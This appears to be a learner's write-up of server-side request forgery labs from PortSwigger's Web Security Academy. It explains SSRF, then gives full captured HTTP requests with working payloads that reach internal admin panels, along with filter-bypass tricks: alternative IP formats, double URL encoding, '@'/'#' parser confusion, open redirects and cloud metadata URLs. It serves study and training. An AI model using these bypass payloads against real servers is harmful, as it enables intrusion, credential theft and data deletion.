SSRF (Server-Side Request Forgery) is when an attacker tricks the server into making a request on their behalf. Normally: **You (client)** send requests and **Server** receives them and responds . But in **SSRF**, you force the **server** to send a request to _somewhere else_ — a place the server _should not_ access.

### What attackers do with SSRF?

1.  Access internal-only services

```
http://127.0.0.1:3306
http://localhost/admin
http://internal-service/api

These services are normally _not exposed to the internet_, but the server can reach them.
```

2. Steal cloud credentials

```
http://169.254.169.254/latest/meta-data/

If the target is on AWS, GCP, Azure, etc., you can read:

- Access keys
- Instance role tokens
- Environment config

This can lead to full cloud account takeover.
```

3. Scan internal network

```
The server can be used like a port scanner:

http://10.0.0.5:22
http://10.0.0.5:8080

If the response changes, you learn which ports are open.
```

4. Leak sensitive data

```
Some internal dashboards require no login when accessed locally.

With SSRF you can reach them.
```

### **Why is it called “Server-Side Request Forgery”?**

- **Forgery** → attacker fakes a request
- **Server-side** → request is sent by the server, not the attacker
- Server is **tricked (“forged”)** into connecting somewhere it shouldn’t

---
### Lab: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system. In this lab their is a stockApi which show the stock of the specific country `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2`  now we have to manipulate it.

```
POST /product/stock HTTP/2
Host: 0ad500de038ae2fe83046e4e00cd0026.web-security-academy.net
Cookie: session=FmMIX4U80h3i7oTLpmwcRrXCswGj4XDw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad500de038ae2fe83046e4e00cd0026.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://0ad500de038ae2fe83046e4e00cd0026.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://localhost/admin/delete?username=carlos
```

---
### Lab: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`. At first we need to find the actual ip. by using intruder we check all the ip 0-255 `stockApi=http://192.168.0.1:8080/` then i got the 192.168.0.200 where status code 404: 

```
POST /product/stock HTTP/2
Host: 0ad900770416639f8032b823002300c2.web-security-academy.net
Cookie: session=2KV3oSs8C3C9VmK1jxSqKNvlfE1n7f1q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad900770416639f8032b823002300c2.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://0ad900770416639f8032b823002300c2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://192.168.0.200:8080/admin/delete?username=carlos
```

### Lab: SSRF with blacklist-based input filter

 SSRF with blacklist-based input filters:
 
Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:

- **Alternative IP formats:**  
    Bypass localhost/127.0.0.1 filters using other representations like:  
    `2130706433`, `017700000001`, `0x7f000001`, or short form `127.1`.
- **Custom domain pointing to localhost:**  
    Use a domain that resolves to **127.0.0.1**, such as a DNS you control or a spoofed Burp Collaborator subdomain like:  
    `spoofed.<id>.burpcollaborator.net`.
- **String obfuscation:**  
    Hide blocked keywords (**localhost**, **127.0.0.1**) using URL encoding, mixed case, dots, Unicode tricks, etc.
- **Redirect-based bypass:**  
    Host a redirect on your own server → that redirect sends the request to the internal service.  
    Try different redirect codes (301, 302, 307, 308) and even protocol switching (HTTP → HTTPS) to bypass filters.

```
POST /product/stock HTTP/2
Host: 0a4c0074037532cd8003178b0087009a.web-security-academy.net
Cookie: session=wJMSjYMP6vK5wFt6HfeoOGXX3CDFjDSu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4c0074037532cd8003178b0087009a.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Origin: https://0a4c0074037532cd8003178b0087009a.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3a%2F%2F127.1%2F%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos

the http://127.1/ is single url encoded and the admin is doubled url encoded if we give /http://127.1/admin then "External stock check blocked for security reasons"
```


### Lab: SSRF with whitelist-based input filter

SSRF with whitelist-based input filters:

**`@` Userinfo Trick:**  
Anything before `@` is treated as credentials, and the real hostname comes after it.  
Filters often check the wrong part.
	`https://expected-host:pass@evil-host`

 **`#` Fragment Trick:**  
    Everything after `#` is ignored in the actual request,  
    but filters may still validate it.
	`https://evil-host#expected-host`    

**DNS Hierarchy Trick:**  
    Required strings can be hidden inside a subdomain you control.
	`https://expected-host.evil-host`
    
**URL Encoding / Double Encoding:**  
    Encoded characters can bypass filters that decode differently from the backend.  
    Double encoding (`%25 -> % -> %23 -> #`) is especially powerful.
    
**Combine Techniques:**  
    These methods can be chained (e.g., encoding + @ + #) to create parser mismatches that bypass SSRF protections.

In this challenge the developer has deployed an anti-SSRF defense you will need to bypass.

```
at first i try stockApi=http://stock.weliketoshop.net status code 500

then stockApi=http://username#@stock.weliketoshop.net response "External stock check host must be stock.weliketoshop.net"

then:
 
POST /product/stock HTTP/2
Host: 0a3b008e03fda7a4801d995c004100d5.web-security-academy.net
Cookie: session=I7nTLWrYiLAYdKkBzkk0GNrYS2jkN6FW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3b008e03fda7a4801d995c004100d5.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://0a3b008e03fda7a4801d995c004100d5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos

actual payload without encoding http://localhost#@stock.weliketoshop.net/admin/delete?username=carlos
```

`#` (URL fragment delimiter)
Everything after `#` → fragment → ignored
Host is **stock.weliketoshop.net**
Because everything after `@` is treated by _some_ parsers as the hostname

**Bypass = double encoding + fragment trick + userinfo (@)**

- `%25%32%33` → `%23` → `#`
- `#` cuts off real host
- Filter sees safe domain after `@`
- HTTP client sends request to localhost  
    → SSRF into internal admin panel.


### Summary:

### **1. Double-encoding trick**

- `%25%32%33` → decodes to `%23`
- `%23` = `#` (fragment separator)
- Filters check the URL **before decoding**, so they don't see the `#`.

### **2. Fragment (`#`) confusion**
After decoding, URL becomes:

```
http://localhost#@stock.weliketoshop.net/...
```

Everything after `#` is ignored by the HTTP client → not part of the request.

### **3. `@` userinfo confusion**
Filters think the host is whatever comes **after** `@`:

```
stock.weliketoshop.net
```

But the real HTTP client ignores this because of the `#`.

### **4. Final effect**
- **Filter sees:** request going to `stock.weliketoshop.net` → allowed
- **Actual request goes to:** `localhost` (internal server)
### **5. Result**
SSRF bypass succeeds → server accesses its own internal admin endpoint.

---
### Lab: SSRF with filter bypass via open redirection vulnerability

This lab try to explain how the Bypassing SSRF filters via open redirection:
```
In this challenge their is a redirection which redirect the next product

GET /product/nextProduct?currentProductId=2&path=/product?productId=2 HTTP/2
Host: 0a2f00df03fa62ff80b2713a000600ae.web-security-academy.net
Cookie: session=fZMN7kwqQEMsypg1KO7668151JhGIePZ; session=dkhrdaOMX86lsx0hMH8QdXw1rmVXBgBJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2f00df03fa62ff80b2713a000600ae.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

by using this we can manipulate in the api and can do ssrf openredirection:

at first the api is like stockApi=/product/stock/check?productId=1&storeId=1

then i manipulated it into /product/nextProduct?currentProductId=2 so it can redirect:

POST /product/stock HTTP/2
Host: 0a2f00df03fa62ff80b2713a000600ae.web-security-academy.net
Cookie: session=GJTBJ89AwpMyuDiupSxWJuvEnK8Kfrg0; session=dkhrdaOMX86lsx0hMH8QdXw1rmVXBgBJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2f00df03fa62ff80b2713a000600ae.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Origin: https://0a2f00df03fa62ff80b2713a000600ae.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=%2f%70%72%6f%64%75%63%74%2f%6e%65%78%74%50%72%6f%64%75%63%74%3f%63%75%72%72%65%6e%74%50%72%6f%64%75%63%74%49%64%3d%32%26%70%61%74%68%3d%68%74%74%70%3a//192.168.0.12:8080/admin/delete?username=carlos

/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos


```

---


